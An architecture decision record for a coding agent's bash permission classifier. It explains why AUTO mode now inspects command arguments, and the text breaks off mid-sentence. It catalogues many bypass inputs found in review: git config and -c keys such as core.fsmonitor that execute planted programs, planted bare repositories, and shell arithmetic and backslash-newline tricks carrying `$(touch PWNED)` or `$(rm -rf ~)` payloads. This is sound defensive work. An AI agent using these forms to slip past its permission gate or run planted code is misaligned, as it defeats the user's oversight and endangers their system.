# 0288. AUTO mode reads a command's arguments, not just its name

Status: Accepted (2026-11-03; owner decisions 1–4 settled 2026-11-03; review
rounds 1 and 2 2026-11-04; #762 dated note 2026-11-11, its fix round 1
2026-11-12; #768 dated note 2026-11-12; #788 dated note 2026-11-12, rewritten
in its fix round 1 and amended in its fix round 2 the same day)
Date: 2026-11-03
Issue: #657 (found while implementing #646 — the impl report's "Write-path
sweep"). Owner-approved, one lane, one commit, plus one review-round commit.
Amends: ADR-0158 (the AUTO classifier's `rules` now read arguments; the git
ALLOW set is narrowed — dated note), ADR-0237 (#204 read a known read-only
NAME's arguments with a dialect's switch table; this extends the same doctrine
to `git`, to `env`, and to five more names — dated note), ADR-0197 §(e) (the
same gate decides a headless delegated child — dated note).
Relates: ADR-0157 (the `auto` posture this drives), ADR-0004 (the regex
`GuardrailExtension` floor, unchanged), ADR-0253 (the gate is shared by any
tool it does not know, and by RPC `permissions/evaluate`), #646, #29, #188,
#204.
pi: `earendil-works/pi@9c9ce8547`. pi has no approval gate
(`packages/coding-agent/docs/security.md`: "it does not ask for approval before
every tool call"), so it has no classifier and no reference to follow; the
closest, `examples/extensions/permission-gate.ts`, matches `rm -rf` / `sudo` /
`chmod 777` with regexes and does not read `git` at all. AELIX-ORIGINAL surface
(ADR-0158).
Tests: `tests/builtin/test_bash_classifier.py` (the `_GIT_CONTROLS_STILL_ALLOW`
/ `_GENERAL_CONTROLS_STILL_ALLOW` / `_SIX_FIVE_SEVEN_NEW_ASKS` corpus, review
round 1's `_R1_ASK` / `_R1_ALLOW` / `_R1_DENY`, and the per-dialect pins),
`tests/builtin/test_classifier_arguments_657.py` (the real gate under `auto`
interactive and a headless child, RPC `permissions/evaluate`, the injected
`safe.bareRepository` guard, and the real bash tool's child reading it).

## Context

Under `auto` the bash classifier (ADR-0158) decides whether a command runs with
no prompt. It allowed `git` by its first non-option word (the subcommand) and
the rest of the read-only commands (`_READ_ONLY`) by name alone — only
`sort` / `date` / `hostname` had their arguments read, because #204 needed a
dialect to read them. That name-only ALLOW is the one permissive decision the
classifier makes, and it was unsound for any read-only NAME whose ARGUMENTS can
write a file or execute a program.

Measured on `main` `3a7ffded` with the real gate (`GuardrailExtension` →
`PermissionExtension`) and real `git` 2.54.0 in a scratch HOME. All of the
following ran or wrote under `auto` with no prompt, and the headless delegated
child (`headless_default="block"`) did not block them either:

- **`git config` writes a config key, which the next read command executes.**
  `git config core.fsmonitor ./x` then `git status` runs `./x`;
  `core.hooksPath`, `core.sshCommand`, `alias.*`, `include.path`,
  `--global` / `--file <path>` are the same shape.
- **`git -c <key>=<value>` does it in one call.** `git -c core.fsmonitor=./x
  status`, `git -c core.sshCommand=./x ls-remote …`, `git -c
  diff.external=./x diff`, `git -c core.editor=./x config -e`.
- **A planted repository.** `git -C vendor …`, `--git-dir=`, `GIT_DIR=`, or a
  flagless command in a folder holding `HEAD` / `config` / `objects` / `refs`
  (git's default `safe.bareRepository=all` discovers it as a bare repo) read an
  attacker-written `core.sshCommand` / `core.fsmonitor`.
- **`git ls-remote`** starts an ssh / `upload-pack` / transport helper.
- **State-changing read-only subcommands.** `git diff|log|show --output=`,
  `git branch|tag` create/delete/move, `git remote add|set-url`, `git reflog
  expire`.
- **`env <cmd>`** runs its operand, so `env rm x` got past the `rm` DENY.
- **`rg --pre`, `uniq in out`, `tree -o`, `yq -i`, `file -C`** — a read-only
  name whose argument writes or executes.
- **A `VAR=value` prefix** (`LD_PRELOAD=…`, `PATH=.:$PATH`, `GIT_*=…`) was not
  read at all.

The precedent for reading arguments was already in the tree: `find -exec` /
`fd -x` DENY, `sort -o` / `date -s` ASK (ADR-0237). This generalises it.

## Decision

The classifier reads a command's arguments before granting the name-only ALLOW.
A form that writes, executes, re-targets the repository, or carries an
assignment prefix is ASK (never silently ALLOW); DENY still wins over
everything. The four owner decisions (2026-11-03):

1. **Every `git -c` and `--config-env` asks.** There is no safe-key list: too
   many keys execute (`core.fsmonitor`, `core.hooksPath`, `core.sshCommand`,
   `core.gitProxy`, `core.editor`, `core.pager`, `diff.external`, `gpg.program`,
   `protocol.*.allow`, `include.path`, …), and a maintained allowlist is a
   standing liability. So `git -c user.name=x log` asks too.

2. **`git -C`, `--git-dir`, `--work-tree`, `--exec-path`, `--namespace`,
   `--super-prefix`, `--attr-source`, and a `GIT_DIR=` / `GIT_*=` assignment
   ask.** In addition, the bash tool exports `safe.bareRepository=explicit`
   (git 2.38+) into the MODEL's child environment, appended via
   `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_<n>` / `GIT_CONFIG_VALUE_<n>` so a
   `GIT_CONFIG_*` the user already set is kept, not clobbered. git then refuses
   to auto-discover a bare repository that was not named by an explicit
   `--git-dir` / `GIT_DIR`, which closes the flagless planted-folder path as a
   second line under the classifier. An ordinary repo (`.git` dir), a worktree
   and a submodule (`.git` FILE), and an explicitly named bare repo are
   unaffected (measured). `git --bare` asks too: it names the working folder as
   the repository explicitly, so the guard would let a planted `config` there
   run (review round 1, V1). The guard is the bash tool's only — not the `!`
   escape in the REPL and the TUI (the user acting as themselves, ungated) nor
   the raw `operations.exec` callers (RPC `bash`, the models-json `!command`).
   A `GIT_DIR=` / `GIT_CONFIG_*=` written as its own statement asks under
   decision 3.

3. **Any `VAR=value` assignment asks, for every command**, because it can
   inject a variable the command reads as code. As a prefix it forces at least
   ASK via `max(name_verdict, ASK)`, so `a=1 rm` stays DENY. Review round 1
   (V2) extended it to every other way a shell sets or clears what the next
   command reads, because the bash tool's own guard is a set of exported
   `GIT_CONFIG_*` variables a statement can rewrite or drop:
   - an assignment written as a statement (`GIT_CONFIG_COUNT=0; git status`,
     `export GIT_DIR=cache; …`, `declare -x` / `typeset -x` / `local` /
     `readonly`, `export -n` / `declare +x`, which un-export, and `unset`);
   - an assignment made while a word is expanded: `$((X=0))`, `$[X=0]`,
     `((X--))`, `${a[X=0]}`, `${X:=v}`, `[[ 1 -eq X=0 ]]`, and `test` with a
     `[` in an argument (`test -v 'path[X=0]'` evaluates the subscript in zsh).
     Each was measured to rewrite an exported `GIT_CONFIG_COUNT` in bash, zsh,
     dash or sh;
   - the same inside an unquoted here-document body, which is expanded before
     the command runs (`true <<EOF` + `$((GIT_CONFIG_COUNT=0))`).

   A payload still DENYs: `export A=$(rm -rf /)` and `A=$(rm -rf /) ls`.

4. **The same root cause outside git is in scope**, in the same function and
   test file: `env` with any operand or option (bare `env` and `env -0` print
   the environment and stay ALLOW, exactly as `printenv` does; the command
   after `env`'s options is classified too, so `env rm -rf /` is DENY like
   `rm -rf /`); `rg --pre` / `--pre-glob` / `--hostname-bin`; `uniq` with an
   output operand; `tree -o` / `-R`; `yq -i` / `-s` / `--split-exp`;
   `file -C` / `-f`.

The git subcommand rules, once past the global-option phase. `config`,
`branch`, `tag` and `remote` are an ALLOWLIST of proven read shapes, parsed
with each command's whole option table from git 2.54's `-h`:

- **`config`** — ALLOW only: a new-style `get` / `list` as the FIRST word (a
  subcommand anywhere else is a legacy key, measured); a legacy read action
  (`--get`, `--get-all`, `--get-regexp`, `--get-urlmatch`, `--get-color`,
  `--get-colorbool`, `-l`/`--list`, also inside a cluster like `-lz` or
  abbreviated like `--li`); or no action and exactly one `section.key`
  operand (`git config user.name`). Safe modifiers: scope (`--global`,
  `--system`, `--local`, `--worktree`), display (`-z`, `--name-only`,
  `--show-origin`, `--show-scope`, `--show-names`), type (`-t`/`--type`,
  `--bool`, `--int`, …), `--includes`, `--fixed-value`, `--default`. Legacy
  options stop at the first operand, as git's do, so `git config core.x v -l`
  is the write it is. ASK: `--comment`, every write action, `-e`/`--edit`,
  `-f`/`--file`/`--blob` in any spelling, an unknown or ambiguous option, a
  second operand with no read action, and a glob.
- **`ls-remote`** — ASK.
- **`--output` / `--ext-diff`** — ASK on the subcommands that ACCEPT them
  (`log`, `show`, `diff`, `whatchanged`, `blame`, `shortlog`, `reflog`,
  `rev-list` — measured; `ls-files`, `status`, `rev-parse`, … reject the option
  and so a glob there is a pathspec, which is why `git ls-files *.md` is a
  read). Any prefix counts, because `diff --no-index` accepts `--ext-dif`
  (F03). The value of a revision option that takes the next word (`--grep`,
  `--author`, `-S`, `-n`, …) is not read as an option — but only for `log`,
  `show`, `whatchanged`, `reflog`, `rev-list` and `diff`, where that was
  measured; `blame -n` and `shortlog -n` are booleans. **`--` does NOT end the
  scan (review round 2, B4):** a value-taking revision option swallows it
  (`git log --decorate-refs -- --output=x` wrote) and `git blame` re-reads its
  legacy `-- <path> <rev>` form, so a `--output` after `--` still asks. The
  cost is a pathspec literally named `--output=…` asking, and a glob before
  `--` on an output-capable subcommand (`git diff *.py`) asking because it
  could expand into a planted `--output=evil.py`.
- **`branch`/`tag`** — ALLOW only a listing. An operand is a name to CREATE
  unless a list-mode option is present: `-l`/`--list`, `--contains`,
  `--no-contains`, `--merged`, `--no-merged`, `--points-at`, and `tag -n`.
  `-v`, `--sort`, `--format` and `--color` do not switch modes (`git branch
  -v x` creates `x`; `git branch --color always` creates `always` — measured).
  Clusters (`-avv`, `-ln2`), abbreviations (`--lis`) and `--` are read the way
  git reads them.
- **`remote`** — ALLOW bare, `-v`/`--verbose`, `get-url`, and `show -n` (no
  network). `show` without `-n` queries the remote; every other subcommand
  writes → ASK.
- **`reflog`** — the subcommand is the FIRST word only (`git reflog show
  expire` reads a ref named `expire`); `expire`, `delete`, `drop` and `write`
  ASK, and so does a glob there.

The global-option phase uses an ALLOWLIST of value-less safe booleans
(`--no-pager`, `-p`, `-P`, `--paginate`, `--no-optional-locks`, …); any other
global option, known-dangerous or merely unknown, → ASK, so a future
value-bearing global flag can never be mistaken for a boolean and let its value
be read as the subcommand.

### Static words and option grammar (review round 1)

The first commit matched dangerous options as exact tokens anywhere in the
argument list. Codex and verify got past that with backslashes and line
continuations (`--out\put=`, `--p\re=`), abbreviations the tool accepts
(`--ext-dif`, `file --comp`), short clusters (`yq -Pi`, `-i=true`, `tree -R`),
`-` and `--` (`uniq - out`), a value slot read as an action (`git config
--comment --get …`), and options after the first operand. So an
argument-sensitive command (`git`, `env`, `rg`, `uniq`, `tree`, `yq`, `file`,
`find`/`fd`, `sort`/`date`/`hostname`) now reads its arguments as follows:

- **Static words.** Each argument is the shell's value after quote removal
  and backslash removal (in double quotes, only before `$` `` ` `` `"` `\`
  and a newline). **An argument that is not static asks**: `$var`, `$(…)`,
  backticks, `$'…'`, `$"…"`, and a brace expansion (`{--output=x,a}` is two
  words). So `rg "$PATTERN"` asks even where the quoted value fills a value
  slot. A glob is static text, but **a glob that could expand into an option
  asks** — one whose first character is an unquoted `*`, `?` or `[` (a
  planted file named `--output=x` or `-delete` would be read as that option),
  and for `uniq` and `git config`, where the operand count matters, any glob.
  For `find`, a glob asks only if it could match one of the exec/delete
  primaries (`*.py` cannot).
- **A word the parser splits where the shell does not** — a line continuation
  with no space around it, `--out\<newline>put=x` — makes the whole command
  ASK.
- **Option grammar.** `-` is an operand and a value-taking option consumes its
  value, attached or the next word, but only for options known to take one:
  guessing a value slot could hide the next word, missing one only reads a
  value as an option (a prompt). Short clusters are expanded the way the tool
  does it (`tree` gives each value letter the NEXT word — `tree -Io out x .`
  writes `x`, measured). Where the tool accepts an abbreviated long option
  (git's parse-options, getopt_long for `file`, `uniq`, `env`), any prefix of a
  dangerous option from `--x` up counts as that option, and an abbreviated
  value-taking option consumes its value too (`file --mag -- -C`, review round
  2); ripgrep 15 and tree 2.3 accept none (measured). macOS `uniq` stops at its
  first operand, so `uniq in -c` writes a file named `-c`: both readings must
  find at most one operand.
- **`--` does not reliably end the options (review round 2, B4).** For `uniq`
  (operand count) it still does, but for the write/exec tools — git's output
  family, `tree`, `file`, `yq` and `rg` — a value-taking option swallows the
  `--` and parsing continues (tree 2.3.2: `tree -aI -- -o V .` writes `V`), so
  the scan for a dangerous option runs over EVERY word, `--` or not. A path or
  pattern literally named like a dangerous option (`git diff -- --output=out`,
  `rg -- --pre`, `file -- -f`, `tree -- -o`) asking is the accepted cost.

The sweep of the rest of `_READ_ONLY`: the commands whose arguments can write
or execute are the five in decision 4 plus `env`; `sort`/`date`/`hostname` were
already read by ADR-0237; `awk`, `sed`, `less`, `more`, `man`, `xargs`, `tar`,
`zip`, `tee`, `ln`, `truncate` are NOT in `_READ_ONLY` (or are recursive
mutators) and already ASK. `tee`/`ln`/`truncate` are `_RECURSIVE_MUTATORS`.

### Measurement

184-command before/after corpus (`.omc/specs/657-impl-evidence/corpus.py.txt`):
93 forms move ALLOW → ASK, 91 stay, and no ordinary read regresses to ASK. The
real-gate and RPC verdicts match (`test_classifier_arguments_657.py`). The
bare-repo guard's effect is measured against real git in
`.omc/specs/657-impl-evidence/bare_guard_effect.py.txt` (planted repo refused;
normal repo / worktree / submodule / append-preserves-user-entries) and
`bare_guard_exec.py.txt` (a flagless transport read executes without the guard
and is refused with it).

Review round 1 (2026-11-04) re-ran the Codex and verify probe corpora (567
inputs, `.omc/specs/657-fix-r1-evidence/`): of the 301 with an independent
expected verdict, 260 matched on the first commit and 301 match now. Round 2
(`.omc/specs/657-fix-r2-evidence/`) re-ran the delta verify's probes against
its own head: the 47 `--`/`--output` combinations all ASK, the 214-command
false-positive corpus moved only `git ls-files *.md` ASK→ALLOW (the should-fix
decision), and the four new ASK classes and the over-asking corrections were
each measured in zsh, bash 3.2 / 5.2, ksh and dash.

## Consequences

- The `auto` posture asks about more git forms. The common reads are unchanged
  (`git status|log|diff|show|branch|tag`, `git remote -v`, `git config --get`).
- A delegated `auto`/`auto-accept-edits` child is REFUSED the new forms (it has
  no approver); `yolo` and plain `-p` are unchanged — they run every command.
- The bias is one-directional: a form the classifier cannot prove read-only is
  ASK, never a silent ALLOW. A missed safe flag costs one prompt; it never
  opens a write.

### Limits

- `safe.bareRepository=explicit` is a no-op on git < 2.38 (the key is unknown
  and ignored); there the classifier's ASK on `-C`/`--git-dir`/`GIT_DIR`/
  assignment and on `ls-remote` is the whole defense.
- The guard is the bash tool's child only. RPC `bash` builds its own
  environment and does not get it; its classifier verdicts (via
  `permissions/evaluate`) are unchanged, which already ASK the flag-based forms.
- **The model can plant, and someone else's command runs it (owner decision
  2026-11-04, verify S4).** Under `auto` the model may write `HEAD`, `config`,
  `objects/` and `refs/` into the project (in-project writes are not asked).
  The user's next `!git status` in the REPL or TUI, or an RPC client's
  `bash`, then runs in that folder WITHOUT the guard and executes the planted
  `core.fsmonitor`. The guard is deliberately not added there: those paths are
  the user (or the client) acting as themselves.
- The guard leaves the environment as it is when `GIT_CONFIG_COUNT` is one git
  refuses (git then stops before it runs anything — measured), when an entry
  already sits at index `COUNT` (it is never overwritten; the skip is logged),
  and on Windows when one of the names is set under two spellings. In the last
  two cases that command runs without the guard; the classifier's ASKs still
  stand.
- A non-static argument asks even where it is harmless (`rg -e "$P" a`,
  `git log --grep="$P"`): reading which quoted expansions fill a value slot is
  not worth the second parser it needs.
- Out of scope: a repository that arrives with an already-adversarial
  `.git/config` (a downloaded archive) and a `git status` the operator
  approves. That is git's own behaviour and is not specific to `auto`; the same
  key-then-read mechanism is measured in the `git config core.fsmonitor` row.
- **A bare name evaluated as arithmetic is left ALLOW (review round 2).**
  `$(( i < 10 ))`, `${a[i]}` and `[[ i -eq 1 ]]` read the value of `i`; if a
  PRIOR command set `i` to `GIT_CONFIG_COUNT=0`, the recursive arithmetic
  evaluation would assign (measured). That prior command is itself an
  assignment statement, which already asks, so the single command is left a
  read. A dynamic word (`$x`, `$(…)`) in the same position asks, because its
  value is not bounded. **Amended 2026-11-11 (#762):** the premise does not
  hold for a name the shell fills itself (`_`, `BASH_REMATCH`, …), which now
  asks, nor for a quote or backslash in arithmetic text; see the #762 note at
  the end.
- **Guard-name matching is the whole `GIT_*` family (review round 2).** Any
  `GIT_*` token anywhere in the source asks, so `grep GIT_DIR` and `git log
  --grep=GIT_CONFIG` ask too. An exact list of the config/repository names git
  reads was rejected for the same reason decision 1 rejected a safe-key list —
  it drifts. `HOME` / `XDG_CONFIG_HOME` are deliberately NOT matched this way
  (git's global config lives under them, but the mention is far too common);
  they are caught only in an assignment position.
- **Windows 8.3 short names are not folded (review round 2, nit).** `GIT~1`,
  `NODE_M~1` and `__PYCA~1` are the 8.3 aliases of `.git` / `node_modules` /
  `__pycache__` only on a specific NTFS volume, and which index `~<n>` a name
  gets depends on the other entries and their creation order — a mapping this
  code cannot reconstruct without the filesystem. Folding them would either
  miss the real alias or refuse legitimate files, so #675's guard leaves them;
  8.3 creation is off by default on modern Windows.

### Review round 1 (2026-11-04)

Codex (F01–F12) and an independent verify pass (V1–V9, S1–S6) found the first
commit's exact-token scans bypassable and some reads over-asked. This round
replaced the scans with static words and each tool's own option grammar (above),
allowlisted the read shapes of `git config` / `branch` / `tag` / `remote`, took
`--bare` out of the global allowlist, extended decision 3 to statement and
expansion assignments, classified the command behind `env`, and made the guard
read `GIT_CONFIG_COUNT` the way git does. The same reading found three gaps
older than #657 and closed them: `find . -de\lete` (static words; it deleted
the tree while it read as ALLOW), `find -fprint0` (a write primary missing from
the DENY set), and a command substitution in a here-document body, a here-string
or a redirect target (`cat <<EOF` + `$(rm -rf ~)`), which `_walk` never visited
— needed anyway for decision 3's here-document case.

### Review round 2 (2026-11-04)

A second verify pass found four more ways past round 1 and some over-asking;
this round closed the classes rather than the single inputs, and is the LAST
fix round (the owner caps them at two) — what stays open is in Limits above.

- **The assignment-while-expanding class (B1–B3).** Round 1 matched assignment
  operators with a regex over the arithmetic / parameter / test contexts
  tree-sitter labels, and missed the ones it does not: a zsh `$name[…]` /
  `$#name[…]` subscript (split into an expansion and a `[` word), a `test` / `[`
  command whose operand git evaluates as a subscript or arithmetic (`test -v
  'a[X=0]'`, `test -t X=0`, measured in bash 5 / ksh / zsh), and an unquoted
  here-document body tree-sitter leaves as one unparsed leaf (`<<-EOF` + a tab,
  a space-indented line). The pass now reads: an assignment operator in an
  arithmetic / index / substring position; a `${!x}` / `${x@P}` / `${x:=v}`;
  a `{X}<file` descriptor name; a dynamic word (`$x`, `$(…)`) the shell
  re-evaluates in those positions; and any `GIT_*` name anywhere. An unparsed
  here-document body is re-read as the double-quoted string it expands like, so
  a `$(rm -rf ~)` inside it still DENYs. A here-document whose first line
  continues into a pipe / redirect / list (`cat <<EOF | sh`), and a redirect
  written before the command name (`> /etc/x echo`), are walked too (both
  ALLOW since ADR-0158).
- **`--` swallowed by a value option (B4).** See the `--output` / `--ext-diff`
  bullet and the Option-grammar note above: the write/exec tools scan every
  word, `--` or not, and an abbreviated value option consumes its value.
- **Over-asking corrected.** Print-only `declare -p` / `export -p` / bare
  `export` / `declare -x` / `typeset -f`, `fd -tx` (`-t` takes `x`), `git
  ls-files *.md` (no `--output`) and the `${x%%=*}` / `[[ $1 == --help ]]` /
  `test -f 'a[1].txt'` false positives run without a prompt again; `echo
  $(( i < 10 ))` was never asked and stays a read. `env --ch dir rm -rf /` is
  now DENY like `env -C`.

### Dated note 2026-11-11 (#762): names the shell fills, and quoted text, in arithmetic

The Limits bullet above leaves a bare name in arithmetic ALLOW because a
prior assignment statement must set it. bash, ksh93 and mksh fill some names
without one, from the command's own words, matches and files, and evaluate
the value again when arithmetic reads it, array subscripts included. With a
repository file `files/z[$(touch PWNED)]`, `ls files/* >/dev/null; echo $((_))`
created `PWNED` in bash 3.2.57 and 5.2.37 (bash fills `_` with the last
argument, here the glob's file name), and so did `(( _ ))`, `$[_]`,
`${a[_]}`, `$(( a[_] ))`, `${PATH:_}`, `[ -n "$((_))" ]` and
`cat <<< $((_))`; `BASH_REMATCH` after `=~` did in both bash builds, and
`KSH_MATCH` after `[[ x = * ]]` in mksh 59c. tree-sitter also reads a `$(…)`
inside quotes in arithmetic text as a literal `raw_string`, while the shells
expand that text first: `echo $(( '$(touch PWNED)' ))` and
`echo $(( 'a[$(touch PWNED)]' ))` created `PWNED` in all nine shells
measured. All were ALLOW on `71f837eb`. Measured with `<shell> -c` in a
scratch directory on macOS bash 3.2.57, zsh 5.9, dash and ksh93u+
2012-08-01, and in Linux docker bash 5.2.37, zsh 5.9, dash 0.5.12,
ksh 93u+m/1.0.10 and mksh 59c (`.omc/probes/762/impl/`).

- **A name the shell fills asks** in `$((…))`, `$[…]`, `(( ))`, a `${a[…]}`
  subscript, a `${x:…}` offset or length, a zsh `$a[…]`, a `${x}[…]` and a
  `-t` operand (`_SHELL_FILLED_NAMES`, `_names_shell_filled`): the forms
  measured above and pinned in `tests/builtin/test_bash_arith_names_762.py`,
  also where a backslash-newline splits the opener (fix round 1, below). The
  list is this lane's call, not the owner's: the names bash, ksh93 and mksh
  set from text a command or its files choose. Measured running the
  planted `$(…)`: `_`, `BASH_REMATCH`, `BASH_ARGV` and `BASH_SOURCE` in
  bash 3.2 and 5.2, `MAPFILE`, `BASH_ALIASES` and `BASH_CMDS` in bash 5.2,
  `REPLY` and `OPTARG` in bash, macOS ksh93u+ and mksh, `KSH_MATCH` in
  mksh and `.sh.match` in macOS ksh93u+. By the shells' manuals, with no
  measured form running
  anything: `FUNCNAME`, `BASH_COMMAND`, `BASH_EXECUTION_STRING`, `PWD`,
  `OLDPWD` and `DIRSTACK` (a path starts with `/`, which arithmetic rejects
  first), and the completion and `bind -x` names (`COMPREPLY`, `COMP_*`,
  `READLINE_*`), which a `-c` shell never sets. zsh, dash and Linux ksh
  93u+m ran none of the name forms.
- **Still a read:** a name the shell sets only to a number (`RANDOM`,
  `SECONDS`, `LINENO`, `PPID` and `OPTIND` ran nothing in the nine shells
  even with `a[$(touch PWNED)]` exported under that name, while `FOO` did in
  bash, macOS ksh93u+ and mksh); a name whose text the shell fixes
  (`BASH_VERSINFO`, `HOSTTYPE`); zsh's `MATCH`, `match` and `reply`, which
  zsh fills but never ran a `$(…)` from (`=~`, a `(#b)` glob and `read -A`
  measured), and which the other shells leave to assignments; and every name
  only an assignment or the environment sets, as above. #756 keeps a cloned
  repository's `.env` from putting such text into the environment.
- **A quote or backslash in `$((…))`, `$[…]` or `(( ))` text asks**
  (`_arith_context_danger`). A backtick there is a substitution that already
  asked, or sits inside a quote.
- **A length or a base-N literal reads no name** (fix round 1).
  `$(( ${#PWD} + 1 ))`, `$(( ${#_} ))`, `$(( ${#COMP_WORDS[@]} - 1 ))`,
  `$((36#REPLY))` and `$((64#_))` asked on the round-1 commit `7cbc282d`
  and were ALLOW on `71f837eb`; they are ALLOW again. A length is a number,
  and by the bash, ksh93, mksh and zsh manuals `36#REPLY` is one base-N
  number. None of 17 length and base-N forms in `$((…))`, `$[…]` or `(( ))`
  created `MARK` in the nine shells, 16 of them with the name holding
  `a[$(: > MARK)]` (`_` from the glob, `REPLY` and `OPTARG` exported,
  `BASH_REMATCH` after `=~`, `KSH_MATCH` after `[[ x = * ]]`) and one on
  `${#PWD}`, while reading the same names did in the shells listed above
  (`.omc/probes/762/fix-r1/item2/`). `_names_shell_filled` skips
  `${#name}`, `${#name[@]}`, `${#name[*]}`, `${#name[N]}` and
  `<digits>#<word>`; the name anywhere else still asks (`$((PWD))`,
  `$(( ${#PWD} + _ ))`, `$(( ${#a[_]} ))`, `$((36#REPLY + REPLY))`).
- **A backslash-newline that splits an opener is read joined** (fix round
  1). This is the lead's call, not the owner's: an adjacent hole of the same
  class, already present on `71f837eb`, closed here as #742
  closed its `${…}` and backtick holes. The shells remove `\⏎` before they
  read the words around it, and tree-sitter-bash 0.25.1 reads it as a blank
  between tokens, so `$(\⏎(` is arithmetic to the shells and a command
  substitution holding a subshell to tree-sitter; no arithmetic check saw
  it. With `files/z[$(: > MARK)]` planted, `echo $(\⏎(echo '$(: > MARK)'))`
  created `MARK` in macOS bash 3.2.57, zsh 5.9 and dash and in Linux bash
  5.2.37, zsh 5.9, dash 0.5.12, ksh 93u+m and mksh 59c (macOS ksh93u+ read a
  command substitution there, as tree-sitter does);
  `ls files/* >/dev/null; echo $(\⏎(echo -_))`, `$\⏎[_]`, `$\⏎{a[_]}`,
  `$\⏎{PATH:_}` and `(\⏎(echo -_))` did in bash 3.2 and 5.2;
  `echo $\⏎['$(: > MARK)']` and `echo $\⏎{PATH:'$(: > MARK)'}` did in bash
  and zsh; and #657's assignment rule missed `echo $(\⏎(echo X=5))` the same
  way. All were ALLOW on `71f837eb` and on `7cbc282d`. Now a command holding
  `\⏎` is also read with each one joined (`_joined_lines_verdict`), and the
  verdict is the higher of the two readings. At the top level of a command,
  all nine shells keep `\⏎` inside a `'…'` or `$'…'`, in the body and on
  the end line of a here-document whose delimiter is quoted, and at the end
  of a comment that starts a word, whose next line they run
  (`.omc/probes/762/fix-r1/grid/keepbn-*.txt` and `heredoc-end-*.jsonl`);
  where tree-sitter puts the backslash in one of those, it is not joined.
  Fix round 2 found a `'…'` and a comment where the shells do not keep it
  (below), and the round-3 verify found nested places where some or all of
  them remove it and this reading keeps it (*kept where the shells remove
  it*, under #762 finish below). The joined text is re-read through
  #742's `_reread`, paid from the same budget: one the budget cannot pay, one
  nested too deep and one that runs out of stack are ASK, and a joined text
  tree-sitter rejects goes to `_reread_lines`, which asks and keeps a DENY in
  a prefix. Of a 345-form grid (`$(`, `$((`, `$[`, `${a[`, `${x:`, `((` and
  `[[` split by one or two `\⏎` in ten contexts, with `_` or a quoted
  payload, beside unsplit controls; `.omc/probes/762/fix-r1/grid/`), 265
  forms created `MARK` in at least one of the nine shells and none of them
  is ALLOW now; 75 went
  from ALLOW to ASK against both `71f837eb` and `7cbc282d`, and the 62 still
  ALLOW ran in no shell (single quotes, `$'…'`, quoted here-document bodies).
- **Cost of the joined reading.** Over the 31,348 corpus, test and
  realistic strings, 185 of the round-3 verify's lines and 249 commands
  continued over two to five lines written for this round (`ls`, `git`,
  `find`, `docker run`, `curl`, `uv run pytest` and others, each in two
  indentations; `.omc/probes/762/fix-r1/corpus/`), the only change from
  `7cbc282d` under
  UNKNOWN or POSIX is ALLOW to ASK on ``echo `date` \⏎ `hostname` `` in both
  indentations: its joined line asked on `71f837eb` already, because
  tree-sitter reads the two backtick substitutions as one. `r\⏎m -rf /` and
  `find . -de\⏎lete` go from ASK to DENY. Joining inside single quotes and
  quoted here-documents as well would have added ASK on three test strings
  (``cat <<'EOF'`` + `x\⏎` + `EOF`, and its `<<\EOF` and `<<E\OF`
  spellings), and joining a comment would have read
  `echo hi # x \⏎echo $(\⏎(echo '$(: > MARK)'))` as ALLOW, which eight
  shells ran. Timings (fix round 2, medians of 7 runs of `classify` on the
  final head on a loaded 18-core machine,
  `.omc/probes/762/fix-r2/perf/perf-final.txt`): `classify` is slower than
  on `7cbc282d`, which had no joined reading, on all three shapes this note
  named, 4.7 against 2.2 ms on a 2,000-line continued `ls`, 5.6 against 3.4
  ms on a word joined 5,000 times and 14.2 against 4.3 ms on 1,000 split
  substitutions. Fix round 1 (`eb98b93b`) scanned every kept range for
  every continuation, so `echo` and 20,000 `'a\⏎b'` (140,004 bytes) took 4,167 ms
  there (1,054 ms with 10,000, 46 ms with 2,000); fix round 2 walks the
  ranges once, in order, beside the continuations, and the same inputs take
  34.5, 15.2 and 2.8 ms, against 26.0, 11.3 and 2.2 ms on `7cbc282d`.
- **Fix round 2: a quote that does not quote, a `#` that starts no comment,
  and a command tree-sitter rejects** (the round-2 verify's findings; shell
  rows in `.omc/probes/762/fix-r2/shells/`, each run with `<shell> -c` in
  the nine shells above with `files/z[$(: > MARK)]` planted).
  - *A `'…'` or `$'…'` in a `${…}` operand inside a double-quoted string or
    an expanded here-document body is literal text to the shells*, as #742's
    `_hidden_code_verdict` already reads it, and they remove a `\⏎` in it:
    `printf "[%s]\n" "${x:-'a\⏎b'}"` printed `['ab']` in eight of the nine
    shells (Linux ksh 93u+m kept it). `cat <<E⏎${x:-'$\⏎(: > MARK)'}⏎E`
    created `MARK` in all nine, `echo "${x:-'$\⏎(: > MARK)'}"` (also with
    `${x-…}`, `${x:?…}` and two `\⏎`) in macOS dash and ksh93u+ and Linux
    dash and mksh, and the `{a[_]}` and `[_]` spellings in the here-document
    in bash 3.2 and 5.2. All were ALLOW on `71f837eb` and on the round-1 fold
    `eb98b93b`, and ask now; the `rm -rf ~` twins of the first two are DENY
    (classified only). `_joined_lines` now joins that `\⏎`, using the same
    rule as `_hidden_code_verdict` (the nearest node that is not an
    `expansion` or `concatenation` is a `string` or `heredoc_body`). Linux
    ksh 93u+m's reading is the unjoined one, which the higher-of-two verdict
    still counts. A `'…'` in an unquoted `${x:-…}` and one inside `$(…)`
    within a double-quoted string still quote, and keep the `\⏎`.
  - *A `#` tree-sitter reads as a comment where the shells start none*
    (the lead's call, not the owner's: present on `71f837eb`, the same
    tree-sitter-against-the-shells class). The shells start a comment only
    at the start of a word; tree-sitter-bash 0.25.1 also starts one after an
    escaped blank, a vertical tab, a form feed, a carriage return and `]]`
    (`echo a\r#$(: > MARK)`, ALLOW on `71f837eb`, created `MARK` in all
    nine; #762 finish), and after `<` and `>`, which #762 finish below
    takes up. `echo \ #$(: >
    MARK)`, `cat \ #…`, `echo \⇥#…`, `echo \⏎\ #…`, `\ #…` and `echo` with an
    unescaped vertical tab or form feed before `#` created `MARK` in all
    nine shells, `ls files/* >/dev/null; echo \ #$((_))` in bash, and
    `[[ a ]]#$(: > MARK)` in dash; all were ALLOW on `71f837eb` and
    `eb98b93b`. Now a comment asks at least unless the byte before its `#`,
    past each `\⏎`, is the start of the command, a blank, a newline or one
    of `;&|()` that no backslash escapes (`_starts_a_comment`; after `;`,
    `&` and `)` the nine shells ran nothing, and #762 finish measured `|`
    and `(` too; fix round 2 also listed `<` and `>`, which #762 finish
    took out), and the source is re-read with
    a backslash before that `#`, which keeps it in its word, through
    `_reread` on the same budget, so `echo \ #$(rm -rf ~)` is DENY. Such a
    comment's `\⏎` is joined too: `printf "[%s]\n" \ #a\⏎b` printed
